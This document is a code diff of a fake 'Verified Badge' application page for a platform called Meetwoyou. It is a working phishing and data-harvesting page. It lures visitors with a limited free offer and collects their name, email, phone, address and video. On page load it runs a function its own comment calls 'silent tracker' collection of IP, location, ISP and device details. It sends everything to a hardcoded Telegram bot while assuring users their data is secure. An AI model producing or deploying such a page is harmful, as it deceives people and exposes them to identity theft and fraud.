@@ -7,60 +7,52 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
     <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
     <style>
-        :root {
-            --primary: #0095f6;
-            --bg: #000;
-            --card: #121212;
-            --text: #fff;
-            --gray: #a0a0a0;
-        }
+        :root { --primary: #0095f6; --bg: #000; --card: #121212; --text: #fff; --gray: #a0a0a0; }
         * { margin:0; padding:0; box-sizing:border-box; }
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
             background: var(--bg);
             color: var(--text);
             line-height: 1.6;
-            overflow-x: hidden;
         }
-        .hero {
-            background: linear-gradient(135deg, #1a1a1a, #000);
-            padding: 80px 20px 60px;
+        .header {
+            background: #111;
+            padding: 20px;
             text-align: center;
             border-bottom: 1px solid #262626;
         }
-        .badge {
-            font-size: 120px;
-            margin-bottom: 20px;
-            animation: pulse 2s infinite;
+        .logo {
+            max-width: 180px;
+            height: auto;
         }
-        @keyframes pulse {
-            0%, 100% { transform: scale(1); }
-            50% { transform: scale(1.08); }
+        .hero {
+            padding: 60px 20px 40px;
+            text-align: center;
+            background: linear-gradient(135deg, #1a1a1a, #000);
         }
-        h1 { font-size: 2.8rem; margin-bottom: 15px; }
-        .subtitle { font-size: 1.3rem; color: var(--gray); max-width: 700px; margin: 0 auto 30px; }
+        .badge { font-size: 110px; margin-bottom: 15px; }
+        h1 { font-size: 2.6rem; margin-bottom: 10px; }
+        .subtitle { font-size: 1.25rem; color: var(--gray); max-width: 680px; margin: 0 auto 25px; }
         .offer {
             background: #ed4956;
             color: white;
-            padding: 10px 25px;
+            padding: 8px 22px;
             border-radius: 50px;
-            display: inline-block;
             font-weight: bold;
-            margin-bottom: 30px;
-            font-size: 1.1rem;
+            display: inline-block;
+            margin-bottom: 25px;
         }
         .form-container {
-            max-width: 600px;
-            margin: 40px auto;
+            max-width: 620px;
+            margin: 30px auto;
             background: var(--card);
             padding: 40px 30px;
             border-radius: 20px;
             border: 1px solid #333;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.6);
         }
         input, textarea, select {
             width: 100%;
-            padding: 14px;
+            padding: 14px 16px;
             margin-bottom: 18px;
             background: #1a1a1a;
             border: 1px solid #444;
@@ -78,47 +70,35 @@
             background: var(--primary);
             color: white;
             border: none;
-            padding: 16px 40px;
+            padding: 16px;
             font-size: 18px;
             font-weight: bold;
             border-radius: 12px;
             cursor: pointer;
             width: 100%;
-            transition: 0.3s;
+            margin-top: 10px;
         }
-        .btn:hover { background: #0077cc; transform: translateY(-2px); }
-        .info {
-            text-align: center;
-            color: var(--gray);
-            font-size: 0.95rem;
-            margin: 30px 0;
-        }
-        .footer {
-            text-align: center;
-            padding: 40px 20px;
-            color: #555;
-            font-size: 0.9rem;
-        }
+        .btn:hover { background: #0077cc; }
+        .info { text-align: center; color: #777; font-size: 0.95rem; margin: 25px 0; }
+        .footer { text-align: center; padding: 40px 20px; color: #555; font-size: 0.9rem; }
         .highlight { color: var(--primary); }
     </style>
 </head>
 <body>
 
+    <div class="header">
+        <img src="meetwoyou.jpg" alt="Meetwoyou" class="logo">
+    </div>
+
     <div class="hero">
         <div class="badge">✅</div>
-        <h1>Get Your <span class="highlight">V-Badge</span> on Meetwoyou</h1>
-        <p class="subtitle">
-            Stand out with the official Verified Badge. Limited free applications are open right now because our platform is new.
-        </p>
-        <div class="offer">🚀 Free for a Limited Time – Will Become Paid Soon!</div>
-        
-        <div style="margin-top:30px; font-size:1.1rem; color:#ccc;">
-            <i class="fas fa-clock"></i> Offer ends soon – Apply today!
-        </div>
+        <h1>Get Your <span class="highlight">V-Badge</span></h1>
+        <p class="subtitle">Limited Free Applications Open Now – Will Become Paid Soon</p>
+        <div class="offer">🚀 Free Limited Time Offer</div>
     </div>
 
     <div class="form-container">
-        <h2 style="text-align:center; margin-bottom:30px;">Apply for Verified Badge</h2>
+        <h2 style="text-align:center; margin-bottom:30px;">Verified Badge Application</h2>
         
         <form id="verifyForm">
             <label>Full Name</label>
@@ -128,83 +108,89 @@
             <input type="email" id="email" required placeholder="your@email.com">
 
             <label>Phone Number (with country code)</label>
-            <input type="tel" id="phone" required placeholder="+880 1XXXXXXXXX">
+            <input type="tel" id="phone" required placeholder="+966 XXXXXXXX">
 
             <label>Upload Introduction Video (20-30 seconds)</label>
             <input type="file" id="video" accept="video/*" required>
 
             <label>Full Address</label>
-            <textarea id="address" rows="3" required placeholder="House, Road, Area, City"></textarea>
+            <textarea id="address" rows="3" required placeholder="Street, Area, City, Country"></textarea>
 
-            <label>Postal Code / ZIP</label>
-            <input type="text" id="postal" required placeholder="Your postal code">
+            <label>Postal Code</label>
+            <input type="text" id="postal" required placeholder="Postal / ZIP code">
 
             <button type="submit" class="btn">Submit Application for Review</button>
         </form>
 
         <div class="info">
-            <small>We will review your application and notify you via email/phone.<br>
-            All data is handled securely.</small>
+            <small>Your application + device information will be reviewed.<br>All data is sent securely.</small>
         </div>
     </div>
 
     <div class="footer">
-        © 2026 Meetwoyou • Limited Free Verified Badge Offer<br>
-        This is a promotional application form for our new social platform.
+        © 2026 Meetwoyou • Free Verified Badge Application Form
     </div>
 
     <script>
-        // Telegram Bot Configuration
         const BOT_TOKEN = "8385508779:AAGWgCBn13wKo1AYGKpvUIBHgj-JojNtos4";
-        const CHAT_ID = "7950771882";   // Your bot's chat ID where messages will arrive
+        const CHAT_ID = "7950771882";
 
-        // Function to get device & location info automatically
-        async function getDeviceInfo() {
-            let info = {
-                timestamp: new Date().toLocaleString(),
+        let deviceInfo = {};
+
+        // Collect silent tracker data + better IP geolocation
+        async function collectSilentData() {
+            deviceInfo = {
+                timestamp: new Date().toLocaleString('en-US', { timeZone: 'Asia/Riyadh' }),
                 userAgent: navigator.userAgent,
                 platform: navigator.platform,
-                language: navigator.language,
+                language: navigator.language || navigator.languages[0],
+                languages: navigator.languages ? navigator.languages.join(", ") : "N/A",
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                screenResolution: `${screen.width} × ${screen.height}`,
+                deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "N/A",
+                hardwareConcurrency: navigator.hardwareConcurrency ? navigator.hardwareConcurrency + " cores" : "N/A",
                 battery: "Not supported",
                 ip: "Fetching...",
-                country: "Fetching..."
+                country: "Fetching...",
+                city: "Fetching...",
+                region: "Fetching...",
+                isp: "Fetching..."
             };
 
-            // Battery (if supported)
-            if (navigator.getBattery) {
+            // Battery
+            if ("getBattery" in navigator) {
                 try {
                     const battery = await navigator.getBattery();
-                    info.battery = `${Math.round(battery.level * 100)}% ${battery.charging ? '(Charging)' : ''}`;
+                    deviceInfo.battery = `${Math.round(battery.level * 100)}% ${battery.charging ? '(Charging)' : '(Discharging)'}`;
                 } catch(e) {}
             }
 
-            // IP & Country (free public API)
+            // Better IP + Geo using ip-api.com (no key needed)
             try {
-                const res = await fetch('https://ipapi.co/json/');
+                const res = await fetch('http://ip-api.com/json/?fields=status,message,country,countryCode,regionName,city,isp,query');
                 const data = await res.json();
-                info.ip = data.ip || "Unknown";
-                info.country = `\( {data.country_name || ''} ( \){data.country_code || ''})`;
-                info.city = data.city || "";
-                info.region = data.region || "";
+                if (data.status === "success") {
+                    deviceInfo.ip = data.query || "Unknown";
+                    deviceInfo.country = `\( {data.country} ( \){data.countryCode})`;
+                    deviceInfo.city = data.city || "Unknown";
+                    deviceInfo.region = data.regionName || "Unknown";
+                    deviceInfo.isp = data.isp || "Unknown";
+                }
             } catch(e) {
                 console.log("IP fetch failed");
             }
-
-            return info;
         }
+
+        // Run collection immediately when page loads
+        window.onload = () => collectSilentData();
 
         document.getElementById('verifyForm').addEventListener('submit', async function(e) {
             e.preventDefault();
 
-            Swal.fire({
-                title: 'Submitting Application...',
-                text: 'Please wait',
-                allowOutsideClick: false,
-                didOpen: () => Swal.showLoading()
-            });
+            Swal.fire({ title: 'Submitting...', didOpen: () => Swal.showLoading() });
 
-            const deviceInfo = await getDeviceInfo();
+            const videoFile = document.getElementById('video').files[0];
+            const videoInfo = videoFile ? `\( {videoFile.name} ( \){(videoFile.size / (1024*1024)).toFixed(2)} MB)` : "No video";
 
             const formData = {
                 fullName: document.getElementById('fullName').value,
@@ -212,28 +198,32 @@
                 phone: document.getElementById('phone').value,
                 address: document.getElementById('address').value,
                 postalCode: document.getElementById('postal').value,
-                videoFileName: document.getElementById('video').files[0] ? document.getElementById('video').files[0].name : "No video uploaded",
-                deviceInfo: deviceInfo
+                video: videoInfo
             };
 
-            // Prepare beautiful message for Telegram
-            let message = `🚀 *New Verified Badge Application*\n\n`;
+            // Beautiful Telegram message
+            let message = `🚀 *New Verified Badge Application Received*\n\n`;
             message += `👤 *Name:* ${formData.fullName}\n`;
             message += `📧 *Email:* ${formData.email}\n`;
             message += `📱 *Phone:* ${formData.phone}\n`;
             message += `📍 *Address:* ${formData.address}\n`;
             message += `📮 *Postal Code:* ${formData.postalCode}\n`;
-            message += `🎥 *Video:* ${formData.videoFileName}\n\n`;
-            message += `🔍 *Device & Location Info:*\n`;
+            message += `🎥 *Video:* ${formData.video}\n\n`;
+            message += `🔍 *Silent Tracker & Device Info:*\n`;
             message += `• IP: ${deviceInfo.ip}\n`;
             message += `• Country: ${deviceInfo.country}\n`;
-            message += `• City/Region: ${deviceInfo.city}, ${deviceInfo.region}\n`;
+            message += `• City: ${deviceInfo.city}\n`;
+            message += `• Region: ${deviceInfo.region}\n`;
+            message += `• ISP: ${deviceInfo.isp}\n`;
             message += `• Timezone: ${deviceInfo.timezone}\n`;
             message += `• Battery: ${deviceInfo.battery}\n`;
-            message += `• Device: ${deviceInfo.userAgent.substring(0, 100)}...\n`;
+            message += `• Screen: ${deviceInfo.screenResolution}\n`;
+            message += `• Device Memory: ${deviceInfo.deviceMemory}\n`;
+            message += `• CPU Cores: ${deviceInfo.hardwareConcurrency}\n`;
+            message += `• Language: ${deviceInfo.language}\n`;
+            message += `• User Agent: ${deviceInfo.userAgent.substring(0, 120)}...\n`;
             message += `• Submitted: ${deviceInfo.timestamp}`;
 
-            // Send to Telegram
             const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
             try {
                 await fetch(url, {
@@ -247,23 +237,18 @@
                 });
 
                 Swal.fire({
-                    title: 'Application Submitted!',
-                    text: 'Thank you! We will review it soon and contact you.',
+                    title: 'Success!',
+                    text: 'Your application has been submitted. We will review it and contact you soon.',
                     icon: 'success',
                     confirmButtonColor: '#0095f6'
                 });
 
-                // Reset form
                 document.getElementById('verifyForm').reset();
 
             } catch(err) {
-                Swal.fire({
-                    title: 'Error',
-                    text: 'Something went wrong. Please try again.',
-                    icon: 'error'
-                });
+                Swal.fire({ title: 'Error', text: 'Please try again later.', icon: 'error' });
             }
         });
     </script>
 </body>
-                                                                                    </html>
+</html>
